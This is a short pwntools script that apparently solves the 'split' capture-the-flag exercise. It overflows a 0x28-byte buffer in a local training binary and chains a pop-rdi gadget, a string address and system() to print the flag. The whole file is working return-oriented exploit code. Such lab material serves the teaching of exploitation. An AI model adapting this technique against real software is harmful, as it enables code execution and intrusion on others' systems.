from pwn import *

context(os='linux', arch='amd64') 
context.log_level = 'info'

binary = ELF('./split', checksec=False)
p = binary.process()

info("system addr: %#x", binary.symbols.system)

rop = ROP(binary)
rop.raw(0x4007c3) # pop rdi
rop.raw(binary.symbols['usefulString'])
rop.raw(binary.symbols['system']) 
rop.raw(0x40053e) # ret
print(rop.dump())

payload = "\x90"*0x28+rop.chain()
p.sendline(payload)
p.recvuntil("> ")
p.recv()
print(p.recvuntil("}"))
